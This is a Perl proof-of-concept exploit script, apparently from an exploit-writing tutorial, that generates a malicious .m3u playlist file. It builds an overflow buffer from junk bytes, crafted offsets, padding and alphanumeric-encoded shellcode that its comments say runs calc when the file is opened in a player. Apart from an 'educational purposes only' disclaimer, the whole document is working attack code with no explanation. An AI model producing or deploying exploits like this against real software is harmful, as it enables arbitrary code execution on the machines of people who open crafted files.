# Script provided 'as is', without any warranty.
# Use for educational purposes only.
#
# Open file in playlist - calc !
#
print "[+] Preparing payload\n";
my $sploitfile="corelanc0d3r_quicksploit.m3u";
my $header="#EXTM3U\n\nHTTP://";
my $junk="A" x 529;
my $field1="\x41\x6d";
my $field2="\x41\x4d"; #boy I love pvefindaddr :-)
my $stuff="\x58\x6d";
$stuff=$stuff."\x05\x02\x01\x6d";
$stuff=$stuff."\x2d\x01\x01\x6d";
$stuff=$stuff."\x50\x6d\xc3";
my $morestuff="D" x 111;
# I think this will execute calc :-)
my
$shellcode="PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIA
J11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBTKJL2HO0Q
U48QUQXBC1Q2L2C4MPEL80P6XLMO53VSLKOHPP1WSKOXPA";
my $payload=$header.$junk.$field1.$field2.$stuff.$morestuff.$shellcode;
print "[+] Writing payload to file\n";
open(FILE,">$sploitfile");
print FILE $payload;
close(FILE);
print "[+] Wrote ".length($payload)." bytes to ".$sploitfile."\n";